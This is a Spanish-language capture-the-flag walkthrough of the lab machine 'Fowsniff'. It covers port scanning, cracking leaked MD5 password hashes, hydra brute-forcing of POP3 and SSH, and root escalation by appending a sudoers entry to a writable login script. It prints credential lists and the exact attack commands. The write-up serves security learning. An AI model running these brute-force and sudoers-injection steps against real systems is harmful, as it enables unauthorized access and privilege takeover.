# Fowsniff

## Initial Scan
```
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP USER PIPELINING UIDL AUTH-RESP-CODE CAPA RESP-CODES
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: post-login Pre-login capabilities more listed ID have IDLE AUTH=PLAINA0001 ENABLE SASL-IR OK LITERAL+ LOGIN-REFERRALS IMAP4rev1
```

## Enum

### HTTP

```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
```
Parece que aquí esta todo correcto, veamos las RRSS de la empresa

### RRSS

```
https://twitter.com/fowsniffcorp
```
Parece que les han pawneado veamos mas a fondo
```
https://pastebin.com/NrAqVeeX
```
Tenemos una serie de hashes, veamos cuales desencriptamos
```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```
Veamos cuales podemos crackear con crackstation
```
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
```
Solo nos falta la pass de stone, el sysadmin

## Pop3

Generamos una wordlist con los users y passwords hallados y testamos en el pop3

```bash
 pj@THM$ hydra -L users.txt -P pass.txt 10.10.208.167 pop3
 [110][pop3] host: 10.10.208.167   login: seina   password: scoobydoo2
```
Entremos
```pop3
pj@crow-foot:~$ nc 10.10.208.167 110
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
RETR 1
 +++++++++++++++++++++
 The temporary password for SSH is "S1ck3nBluff+secureshell"
 +++++++++++++++++++++
```
### SSH

Entramos en 

```
pj@THM$ hydra -L users.txt -p "S1ck3nBluff+secureshell" 10.10.208.167 ssh
[22][ssh] host: 10.10.208.167   login: baksteen   password: S1ck3nBluff+secureshell
```

## Privesc

Una vez dentro
```
baksteen@fowsniff:~/Maildir$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```
El grupo users es sospechoso 
```
baksteen@fowsniff:~/Maildir$ find / -group users 2> /dev/null
/opt/cube/cube.sh
```
Veamos el script 
```
baksteen@fowsniff:~/Maildir$ cat /opt/cube/cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```
Así mejor 

```
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

echo 'baksteen  ALL=(ALL:ALL) ALL' >> /etc/sudoers 
```
Mirando el 00-header vemos que se invoca al script cada vez que alguien se logea,veamos si podemos explotar esto

Ahora salimos y entramos de nuevo con la diferencia de que:
```
User baksteen may run the following commands on fowsniff:
    (ALL : ALL) ALL
```
